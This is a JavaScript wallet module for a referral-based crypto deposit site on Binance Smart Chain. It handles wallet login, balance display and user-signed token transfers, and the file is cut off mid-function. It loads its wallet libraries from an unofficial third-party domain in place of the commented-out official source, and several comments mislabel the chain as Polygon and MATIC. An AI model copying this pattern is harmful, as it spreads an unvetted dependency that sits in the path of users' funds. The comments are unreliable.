window.process = {
  env: {
    NODE_ENV: "production",
  },
};

import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
  WagmiCore,
  WagmiCoreChains,
  WagmiCoreConnectors,
} from "https://coinicon.io/assets/wallet/bundle.js";
//"https://unpkg.com/@web3modal/html"
import { Web3Modal } from "https://coinicon.io/assets/wallet/newhtml/htmlbundell.js";
import { parseEther } from "https://esm.sh/viem";

// USDT Contract ABI (minimal ABI for balanceOf and transfer)
const USDT_ABI =[{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];
const COIN_ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];

// USDT contract address on Polygon
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const COIN_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const INCRESSADDRESS = '0x10d8f91Dd9f03ed3385D375A9f3dD36C6D25dbcc';
const POLYGON_CHAIN = {
  id: 56,  // BSC Mainnet Chain ID
  name: "Binance Smart Chain",
  network: "bsc",
  nativeCurrency: {
    name: "BNB",
    symbol: "BNB",
    decimals: 18,
  },
  rpcUrls: {
    default: {
      http: ["https://bsc-dataseed.binance.org/"],
    },
  },
  blockExplorers: {
    default: { name: "BscScan", url: "https://bscscan.com" },
  },
};

export class Web3Connector {
  constructor(projectId) {
    this.projectId = projectId;
    this.web3 = null;
    this.publicClient = null;
    this.selectedAccount = null;
    this.isConnected = false;

    // Initialize Wagmi configuration
    const {
      configureChains,
      createConfig,
      getAccount,
      getNetwork,
      switchNetwork,
    } = WagmiCore;
    const { bsc } = WagmiCoreChains;
    this.chains = [bsc];

    const { publicClient } = configureChains(this.chains, [
      w3mProvider({ projectId }),
    ]);
    this.wagmiConfig = createConfig({
      autoConnect: true,
      connectors: w3mConnectors({ projectId, chains: this.chains }),
      publicClient,
    });

    this.ethereumClient = new EthereumClient(this.wagmiConfig, this.chains);
    this.web3modal = new Web3Modal({ projectId }, this.ethereumClient);
    this.getAccount = getAccount;
    this.getNetwork = getNetwork;
    this.switchNetwork = switchNetwork;
  }

  async init() {
    try {
      //Login User
      const loginButton = document.getElementById("loginButton");
      if (loginButton) {
        loginButton.addEventListener("click", async () => {
        //loginButton.addEventListener("click", async function handler() {
            // prevent double clicks
            loginButton.disabled = true;
            loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
          
            this.newlogin();
            // remove event listener if you want it strictly once
            //loginButton.removeEventListener("click", handler);
        });
      }
      //Register User
      const registerButton = document.getElementById("registerButton");
      if (registerButton) {
            registerButton.addEventListener("click", async () => {
            //registerButton.addEventListener("click", async function handler() {
           
            // prevent double clicks
            registerButton.disabled = true;
            registerButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Register in...';
            
            this.newregister();
            
            // remove event listener if you want it strictly once
            //registerButton.removeEventListener("click", handler);
        });
      }
      // Add event listeners for wallet changes
      // Check if already connected
      const account = this.getAccount();
      if (account.isConnected) {
        // Check chain immediately
        const network = this.getNetwork();
        const targetChainId = 56; // Polygon Mainnet

        if (network.chain?.id !== targetChainId) {
          document.getElementById('statusMessage').textContent = 'Wrong network detected. Please switch to Binance Smart Chain network.';
          // Show switch network button
          const switchButton = document.createElement('button');
          switchButton.textContent = 'Switch to Binance Smart Chain';
          switchButton.onclick = () => this.ensureCorrectChain();
          document.getElementById('statusMessage').appendChild(switchButton);
        } else {
          // If on correct chain, proceed with connection
          await this.checkConnection();
        }
      }

      // Add subscription for account changes
      this.wagmiConfig.subscribe(
        (data) => {
          if (data.address) {
            //console.log('Account changed:', data.address);
            this.handleAccountChange();
          }
        }
      );
    } catch (error) {
      //console.error("Error initializing Web3Connector:", error);
      //document.getElementById("statusMessage").textContent =  "Error: " + error.message;
    }
  }
  async connect() {
    try {
      document.getElementById('statusMessage').textContent = 'Connecting...';
      const unsubscribe = this.web3modal.subscribeModal(async (newState) => {
        if (!newState.open && this.isWalletConnected()) {
          unsubscribe();
          const result = await this.checkConnection();
          //console.log('Connection result:', result);
          this.init();
        }
      });
      await this.web3modal.openModal();
      const result = await this.checkConnection();
      // console.log('Connection result:', result);
      // this.init();
      return result;
    } catch (error) {
      //console.error('Error connecting wallet:', error);
      //document.getElementById('statusMessage').textContent = 'Error connecting: ' + error.message;
      throw error;
    }
  }
  async newlogin() {
    try {

      const web3 = await connector.getWeb3();
      const selectedAccount = await connector.getSelectedAccount();
      $.ajax({
            type: 'POST',
            url: `${panelLoginPath}`,
            data: {
                user_address: selectedAccount,
                _token: csrfToken
            },
            dataType: 'json',
            success: function(response) {
                if (response.status === 'success') {
                    document.getElementById("statusMessage").textContent = 'Login Successfully';
                    document.getElementById("statusMessage").style.color = '#fca92d';
                    window.location.href = response.redirect;
                } else {
                    // Handle backend error response
                    loginButton.disabled = false;
                    loginButton.innerHTML = 'Loging';
                    document.getElementById('statusMessage').textContent =
                        'Login Failed! ' + (response.message ?? 'Unknown error.');
                    document.getElementById('statusMessage').style.color = 'red';
                }
            },
            error: function(xhr) {
                loginButton.disabled = false;
                loginButton.innerHTML = 'Loging';
                let errorMsg = 'Login failed due to a server error.';
                if (xhr.responseJSON && xhr.responseJSON.message) {
                    errorMsg = xhr.responseJSON.message; // e.g. "User not found."
                }
                document.getElementById('statusMessage').textContent = 'Login Failed! ' + errorMsg;
                document.getElementById('statusMessage').style.color = 'red';
            }
        });
    } catch (error) {
      //console.error("Error updating wallet info:", error);
     // document.getElementById("statusMessage").textContent = error;
     // document.getElementById("statusMessage").style.color = "red";
      //resetWalletInfo();
    }
  }
  async newregister() {
    try {
      const web3 = await connector.getWeb3();
      const selectedAccount = await connector.getSelectedAccount();
      
          $.ajax({
            type: 'POST',
            url: `${panelRegisterPath}`,
            data: {
                register: 1,
                u_sponsor: document.getElementById('u_sponsor').value,
                user_address: selectedAccount,
                _token: csrfToken
            },
            success: function(response) {
                if (response.status === 'success') {
                    document.getElementById("statusMessage").textContent = 'Register Successfully';
                    document.getElementById("statusMessage").style.color = '#fca92d';
                    window.location.href = response.redirect;
                } else {
                    registerButton.disabled = false;
                    registerButton.innerHTML = 'Register';
                    document.getElementById('statusMessage').textContent =
                        'Register Failed! ' + (response.message ?? 'Unknown error.');
                    document.getElementById('statusMessage').style.color = 'red';
                }
            },
            error: function(xhr) {
                let message = 'An error occurred. Please try again.';
                registerButton.disabled = false;
                registerButton.innerHTML = 'Register';
        
                // Handle Laravel 422 validation errors
                // if (xhr.status === 422 && xhr.responseJSON?.errors) {
                //     const firstError = Object.values(xhr.responseJSON.errors)[0][0]; 
                //     message = firstError;
                // } else if (xhr.responseJSON?.message) {
                //     message = xhr.responseJSON.message;
                // }
        
                // Show error in UI
                const statusEl = document.getElementById('statusMessage');
                if (statusEl) {
                    statusEl.textContent = message;
                    statusEl.style.color = 'red';
                }
            }
        });
    } catch (error) {
      //console.error("Error updating wallet info:", error);
      //document.getElementById("statusMessage").textContent = 'Somethings want wrong!';
      //document.getElementById("statusMessage").style.color = "red";
      //resetWalletInfo();
    }
  }
  async checkConnection() {

    try {
      const account = this.getAccount();
      if (account.isConnected) {
        document.getElementById("statusMessage").textContent =
          "Checking network...";

        // Check if we're on the correct chain
        await this.ensureCorrectChain();

        // Get the provider using Wagmi's getWalletClient
        const { getWalletClient } = WagmiCore;
        const walletClient = await getWalletClient();
        if (walletClient) {
          this.web3 = new Web3(walletClient.transport);
          this.selectedAccount = account.address;
          this.isConnected = true;

          document.getElementById("statusMessage").textContent =
            "Connected to Binance Smart Chain network";
          document.getElementById("statusMessage").style.color = "white";
          if (document.getElementById("sendUsdt")) {
            document.getElementById("sendUsdt").classList.remove("hidden");
            document.getElementById('sendUsdt').style.display = '';
          }
          if (document.getElementById("Disconnect")) {
            document.getElementById("Disconnect").classList.remove("hidden");
          }
          if (document.getElementById("loginButton")) {
            document.getElementById("loginButton").classList.remove("hidden");
          }
          if (document.getElementById("registerButton")) {
            document.getElementById("registerButton").classList.remove("hidden");
          }
          if (document.getElementById('swapButton')) {
    		document.getElementById('swapButton').classList.remove('hidden');
          }   
          if (document.getElementById("connectButton")) {
            document.getElementById("connectButton").classList.add("hidden");
          }
          // Dispatch connection event
          window.dispatchEvent(
            new CustomEvent("web3Connected", {
              detail: {
                web3: this.web3,
                account: this.selectedAccount,
              },
            })
          );

          return {
            web3: this.web3,
            account: this.selectedAccount,
          };
        }
      }

      this.disconnect();
      document.getElementById("statusMessage").textContent = "Not connected";
      return null;
    } catch (error) {
      //console.error("Error checking connection:", error);
      document.getElementById("statusMessage").textContent =
        "Error: " + error.message;
      this.disconnect();
      throw error;
    }
  }

  async getWeb3() {
    if (!this.web3 || !this.isConnected) {
      const { getPublicClient, getWalletClient } = WagmiCore;
      const publicClient = getPublicClient();
      const walletClient = await getWalletClient();

      if (walletClient) {
        // Use the walletClient's provider for sending transactions
        this.web3 = new Web3(walletClient.transport);
        // Also store the public client for read operations
        this.publicClient = publicClient;
      }
    }
    return this.web3;
  }

  async ensureCorrectChain() {
    try {
      const network = this.getNetwork();
      const targetChainId = 56; // Binance Smart Chain Mainnet

      if (network.chain?.id !== targetChainId) {
        document.getElementById("statusMessage").textContent =
          "Switching to Binance Smart Chain network...";

        try {
          // Try switching chain using Wagmi
          await this.switchNetwork({ chainId: targetChainId });
        } catch (switchError) {
          // If the chain hasn't been added to MetaMask, add it
          if (switchError.code === 4902 || switchError.code === -32603) {
            try {
              await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [POLYGON_CHAIN],
              });
            } catch (addError) {
              throw new Error("Failed to add Binance Smart Chain network to MetaMask");
            }
          } else {
            throw new Error("Failed to switch to Binance Smart Chain network");
          }
        }

        document.getElementById("statusMessage").textContent =
          "Successfully connected to Binance Smart Chain network";
        return true;
      }
      return true;
    } catch (error) {
      //console.error("Error ensuring correct chain:", error);
      document.getElementById("statusMessage").textContent =
        "Error: " + error.message;
      throw error;
    }
  }

  async handleAccountChange() {
    document.getElementById("statusMessage").textContent =
      "Account changed, checking connection...";
    await this.checkConnection();
  }

  async handleChainChange() {
    document.getElementById("statusMessage").textContent =
      "Network changed, checking connection...";
    await this.checkConnection();
  }

  disconnect() {
    this.web3 = null;
    this.publicClient = null;
    this.selectedAccount = null;
    this.isConnected = false;

    // Dispatch disconnection event
    window.dispatchEvent(new CustomEvent("web3Disconnected"));
  }

  getSelectedAccount() {
    const account = this.getAccount();
    return account.isConnected ? account.address : null;
  }

  isWalletConnected() {
    const account = this.getAccount();
    return account.isConnected;
  }
}


// Initialize the connector
const connector = new Web3Connector("a2745039469e414ecfcf3a08f33b0e88");
await connector.init();

export default connector;

// Wait for DOM to be loaded
// Check initial connection and update wallet info
let connectButton = document.getElementById('connectButton');
const walletAddressDisplay = document.getElementById('walletAddress');
const walletBalanceDisplay = document.getElementById('walletBalance');
const usdtBalanceDisplay = document.getElementById('usdtBalance');
const usdcBalanceDisplay = document.getElementById('usdcBalance');
let userAccount = null;
connectButton.addEventListener('click', async () => {

  try {
    document.getElementById('statusMessage').textContent = 'Connecting...';

    let conn = await connector.connect();
    //console.log("conn => ", conn);
    let connCheck = await connector.checkConnection();
    await checkConnectionLoop();
    if (connector.isConnected) {
      web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();

      if (accounts.length === 0) {
        alert("No accounts found. Please unlock your wallet.");
        return;
      }

      userAccount = accounts[0];
      walletAddressDisplay.textContent = `Connected: ${userAccount}`;
      document.getElementById('statusMessage').textContent = 'Wallet connected successfully!';

      await updateWalletInfo()

      window.ethereum.on('accountsChanged', async (accounts) => {
        if (accounts.length > 0) {
          userAccount = accounts[0];
          walletAddressDisplay.textContent = `Connected: ${userAccount}`;
          await updateWalletInfo()
        } else {
          userAccount = null;
          walletAddressDisplay.textContent = 'Not Connected';
        }
      });
    } else {
      document.getElementById('statusMessage').textContent = 'Wallet not connected.';
      userAccount = null;
      walletAddressDisplay.textContent = 'Not Connected';
      usdcBalanceDisplay.textContent = 'USDC Balance: 0';
      usdtBalanceDisplay.textContent = 'USDT Balance: 0';
    }

  } catch (error) {
    //console.error("Wallet connection error:", error);
    //document.getElementById('statusMessage').textContent = 'Error connecting: ' + error.message;
  }
});





async function checkConnectionLoop() {
  try {
    let connected = await connector.checkConnection();

    if (!connected) {
      //console.log("Rechecking connection...");
      setTimeout(checkConnectionLoop, 2000);
    } else {
      console.log("Wallet connected successfully!");
      await connectAgain();
    }
  } catch (error) {
    //console.error("Error in checkConnectionLoop:", error);
    setTimeout(checkConnectionLoop, 2000);
  }
}



const connectAgain = async () => {
  try {
    web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();

    if (accounts.length === 0) {
      alert("No accounts found. Please unlock your wallet.");
      return;
    }

    userAccount = accounts[0];
    walletAddressDisplay.textContent = `Connected: ${userAccount}`;
    document.getElementById('statusMessage').textContent = 'Wallet connected successfully!';

    await updateWalletInfo()

    window.ethereum.on('accountsChanged', async (accounts) => {
      if (accounts.length > 0) {
        userAccount = accounts[0];
        walletAddressDisplay.textContent = `Connected: ${userAccount}`;
        await updateWalletInfo()
      } else {
        userAccount = null;
        walletAddressDisplay.textContent = 'Not Connected';
      }
    });
  } catch (error) {
    //console.error("Wallet connection error:", error);
    //document.getElementById('statusMessage').textContent = 'Error connecting: ' + error.message;
  }
};

await updateWalletInfo();
// Add event listeners for wallet connection changes
window.addEventListener("web3Connected", async () => {
  //console.log("Wallet connected event");
  await updateWalletInfo();
});

window.addEventListener("web3Disconnected", () => {
  //console.log("Wallet disconnected event");
  resetWalletInfo();
});

// Add account change listener
const unsubscribe = connector.wagmiConfig.subscribe((data) => {
  if (data.address) {
    //console.log("Account changed:", data.address);
    updateWalletInfo();
  }
});

async function getUSDTDecimals() {
  try {
    const web3 = await connector.getWeb3();
    const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
    return await usdtContract.methods.decimals().call();
  } catch (error) {
    //console.error("Error getting USDT decimals:", error);
    return 6; // USDT default decimals
  }
}

async function updateWalletInfo() {
  try {
    if (!connector.isWalletConnected()) {
      resetWalletInfo();
      return;
    }

    const web3 = await connector.getWeb3();
    const selectedAccount = await connector.getSelectedAccount();
    document.getElementById("walletAddress").textContent = selectedAccount;

    // Get MATIC balance
    const balance = await web3.eth.getBalance(selectedAccount);
    const maticBalance = web3.utils.fromWei(balance, "ether");
    document.getElementById("maticBalance").textContent =
      parseFloat(maticBalance).toFixed(4);

    try {
      // Get USDT balance with proper parameter formatting
      const usdtContract = new web3.eth.Contract(COIN_ABI, COIN_ADDRESS);
      const usdtBalance = await usdtContract.methods
        .balanceOf(selectedAccount)
        .call();
      const decimals = await getUSDTDecimals();
      // Convert BigInt to string before division
      const formattedUsdtBalance = (
        Number(usdtBalance) / Number(10n ** BigInt(decimals))
      ).toFixed(2);
      document.getElementById("usdtBalance").textContent =
        formattedUsdtBalance;
        // Enable/disable the button based on balance
        const sendButton = document.getElementById("sendUsdt");
        if (formattedUsdtBalance > 0) {
            sendButton.disabled = false;  // enable button
        } else {
            sendButton.disabled = true;   // disable button
        }
    } catch (tokenError) {
      //console.error("Error fetching token balance:", tokenError);
      document.getElementById("usdtBalance").textContent = "0";
    }
  } catch (error) {
    //console.error("Error updating wallet info:", error);
    resetWalletInfo();
  }
}

function resetWalletInfo() {
    if (document.getElementById("walletAddress")) {
      document.getElementById("walletAddress").textContent = "Not connected";
    }
    if (document.getElementById("maticBalance")) {
        document.getElementById("maticBalance").textContent = "0";
    }
    if (document.getElementById("usdtBalance")) {
        document.getElementById("usdtBalance").textContent = "0";
    }
}

async function sendMatic(to, amount) {
  try {
    if (!connector.isWalletConnected()) {
        if (document.getElementById("statusMessage")) {
            document.getElementById("statusMessage").textContent ="Please connect your wallet first";
        }
      return;
    }
    document.getElementById('sendMatic').style.display = 'none';

    const { getPublicClient, getWalletClient, getNetwork } = WagmiCore;
    const publicClient = getPublicClient();
    const walletClient = await getWalletClient();
    const network = getNetwork();

    if (!walletClient) {
      throw new Error("No authorized account found");
    }

    // Check if we're on Binance Smart Chain network
    if (network.chain?.id !== 56) {
      // 56 is Binance Smart Chain's chain ID
      throw new Error("Please switch to Binance Smart Chain network");
    }

    const selectedAccount = walletClient.account.address;

    if (!selectedAccount) {
      throw new Error("No authorized account found");
    }

    // Convert amount to Wei
    const value = parseEther(amount.toString());
    //console.log("Sending amount in Wei:", value.toString());

    document.getElementById("statusMessage").textContent =
      "Preparing transaction...";

    // Get the gas estimate
    const gasEstimate = await publicClient.estimateGas({
      account: selectedAccount,
      to: to,
      value: value,
    });

    //console.log("Gas estimate:", gasEstimate.toString());

    document.getElementById("statusMessage").textContent =
      "Sending MATIC... Please wait for confirmation.";

    // Send transaction using walletClient
    const txHash = await walletClient.sendTransaction({
      account: selectedAccount,
      to: to,
      value: value,
      gas: gasEstimate * 5n,
      chain: network.chain,
    });

    document.getElementById('statusMessage').textContent = "Please Wait while transaction is confirming.";
    // Send to backend for token purchase
    // Send to backend for token purchase
    const receipt = await publicClient.waitForTransactionReceipt({
      hash: txHash,
      confirmations: 1,
      timeout: 60_000,
    });

    if (receipt.status === 'success') {
      //console.log("TXN receipt11:", receipt);
    var receipt_txn = waitForTransactionReceipt(receipt.transactionHash)
    if(receipt_txn){
              var add_trans = await sendToBackend(`${panelPath}fund/new_fund_add`, {
                amnt: amount,
                tx_hash: receipt.transactionHash,
              });
              if (typeof add_trans === "string") {
                add_trans = JSON.parse(add_trans);
              }
              //console.log("Parsed add_trans:", add_trans);
              //console.log("Before sleep", add_trans);
             
            //   console.log("Call add fund invest");
              document.getElementById("statusMessage").textContent =
                "Fund added successfully.";
              document.getElementById("statusMessage").style.color = "white";
      }
      window.location.href = `${panelPath}dashboard`;
      //   } else {
      //     document.getElementById("statusMessage").textContent =
      //       "Fund Have already Request for this Transcation.";
      //     document.getElementById("statusMessage").style.color = "red";
      //   }

      console.log("Transaction hash:", txHash);
      await updateWalletInfo();

      document.getElementById('statusMessage').textContent = 'Transaction confirmed successfully!';

    } else {
      console.log("TXN receipt22:", receipt);
      // throw new Error('Transaction failed');
      document.getElementById('statusMessage').textContent = "Error in transaction";
    }
    console.log("TXN receipt:", receipt);
    //const txHash ='0xcaf3e4f43296fdcdc68dc37faf82052082c383aeba3782d66bfa653aec963a28';

  } catch (error) {
    console.error("Error sending MATIC:", error);
    document.getElementById("statusMessage").textContent = error;
    // "User rejected the request.";
    document.getElementById("statusMessage").style.color = "red";
  }
}
    async function waitForTransactionReceipt(txHash) {
        while (true) {
            console.log("TransactionReceipt called");

            const receipt = await window.ethereum.request({
                method: 'eth_getTransactionReceipt',
                params: [txHash],
            });

            if (receipt) {
                return receipt;
            }

            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }

async function sendToBackend(url, data) {
  return new Promise((resolve, reject) => {
    $.ajax({
      type: "POST",
      url: url,
      data: data,
      success: resolve,
      error: reject,
    });
  });
}
async function sendUsdt(to, amount) {
  console.log("Input amount:", amount);
  try {
        if (document.getElementById("sendUsdt")) {
            document.getElementById('sendUsdt').style.display = 'none';
        }
        if (!connector.isWalletConnected()) {
            document.getElementById("statusMessage").textContent =
            "Please connect your wallet first";
            document.getElementById("statusMessage").style.color = "red";
            return;
        }

        const { getPublicClient, getWalletClient, getNetwork } = WagmiCore;
        const publicClient = getPublicClient();
        const walletClient = await getWalletClient();
        const network = getNetwork();

        if (!walletClient) {
            throw new Error("No authorized account found");
        }

        // Check if we're on Binance Smart Chain network
        if (network.chain?.id !== 56) {
          // 56 is Binance Smart Chain's chain ID
          throw new Error("Please switch to Binance Smart Chain network");
        }

        const web3 = await connector.getWeb3();
        const selectedAccount = walletClient.account.address;
    
        if (!selectedAccount) {
          throw new Error("No authorized account found");
        }

        // Create contract instance
        const usdtContract = new web3.eth.Contract(COIN_ABI, COIN_ADDRESS);
    
        // Get decimals using public client
        const decimals = await publicClient.readContract({
          address: COIN_ADDRESS,
          abi: COIN_ABI,
          functionName: "decimals",
        });
    
        console.log("Decimals:", decimals);
    
        // Convert amount to smallest unit using string manipulation to avoid floating point issues
        const parts = amount.toString().split(".");
        const wholePart = parts[0];
        const decimalPart = parts[1] || "0";
    
        // Pad with zeros or truncate to match token decimals
        let paddedDecimal = decimalPart;
        if (paddedDecimal.length < decimals) {
          paddedDecimal = paddedDecimal.padEnd(decimals, "0");
        } else if (paddedDecimal.length > decimals) {
          paddedDecimal = paddedDecimal.slice(0, decimals);
        }
    
        const amountInSmallestUnit = wholePart + paddedDecimal;
        console.log("Amount in smallest unit:", amountInSmallestUnit);
    
        document.getElementById("statusMessage").textContent =
          "Sending USDT... Please wait for confirmation.";
    
        // Prepare the transaction data
        const data = usdtContract.methods
          .transfer(to, amountInSmallestUnit)
          .encodeABI();
    
        // Send the transaction using walletClient with chain specified
        const txHash = await walletClient.sendTransaction({
          chain: network.chain,
          to: COIN_ADDRESS,
          data,
          account: selectedAccount,
        });
        const receipt = await publicClient.waitForTransactionReceipt({
          hash: txHash,
          confirmations: 1,
          timeout: 60_000,
        });
    
        if (receipt.status === 'success') {
        console.log("TXN receipt11:", receipt);
        var receipt_txn = waitForTransactionReceipt(receipt.transactionHash)
        if(receipt_txn){
                  var add_trans = await sendToBackend(`${panelFUNDPath}`, {
					amount: document.getElementById('amount').value,
					tx_hash: receipt.transactionHash,
						wallet:selectedAccount,
						_token: csrfToken
				});
                  if (typeof add_trans === "string") {
                    add_trans = JSON.parse(add_trans);
                  }
                  console.log("Parsed add_trans:", add_trans);
                  document.getElementById("statusMessage").textContent = "Fund added successfully.";
                  document.getElementById("statusMessage").style.color = "white";
                   hideLoadingModal();
                  showSuccessModal(receipt.transactionHash,document.getElementById('amount').value);
        }
        //window.location.href = `${panelPath}dashboard/user`;
        console.log("Transaction hash:", txHash);
        await updateWalletInfo();
        document.getElementById("statusMessage").textContent = "USDT sent successfully!";
        }
    } catch (error) {
         hideLoadingModal();
        console.error("Error sending USDT:", error);
        document.getElementById("statusMessage").textContent ="Error sending USDT Something want wrong! ";
    }
}
async function increUsdt(to, amount) {
	try {
			if (document.getElementById('sendUsdt')) {
			    document.getElementById('sendUsdt').style.display = 'none';
		    }
    		if (!connector.isWalletConnected()) {
    			document.getElementById('statusMessage').textContent = 'Please connect your wallet first';
    			document.getElementById('statusMessage').style.color = 'red';
    			return;
    		}

		const {getPublicClient,getWalletClient,getNetwork} = WagmiCore;
		const publicClient = getPublicClient();
		const walletClient = await getWalletClient();
		const network = getNetwork();

		if (!walletClient) {
				throw new Error('No authorized account found');
		}

		// Check if we're on Binance Smart Chain network
		if (network.chain?.id !== 56) {
			// 56 is Binance Smart Chain's chain ID
				throw new Error('Please switch to Binance Smart Chain network');
		}

		const web3 = await connector.getWeb3();
		const selectedAccount = walletClient.account.address;

		if (!selectedAccount) {
				throw new Error('No authorized account found');
		}

		// Create contract instance
		const usdtContract = new web3.eth.Contract(COIN_ABI, COIN_ADDRESS);

		// Get decimals using public client
		const decimals = await publicClient.readContract({
			address: COIN_ADDRESS,
			abi: COIN_ABI,
				functionName: 'decimals',
		});

		console.log('Decimals:', decimals);

		// Convert amount to smallest unit using string manipulation to avoid floating point issues
		const parts = amount.toString().split('.');
		const wholePart = parts[0];
		const decimalPart = parts[1] || '0';
    
    		// Pad with zeros or truncate to match token decimals
    		let paddedDecimal = decimalPart;
    		if (paddedDecimal.length < decimals) {
    				paddedDecimal = paddedDecimal.padEnd(decimals, '0');
    		} else if (paddedDecimal.length > decimals) {
    			paddedDecimal = paddedDecimal.slice(0, decimals);
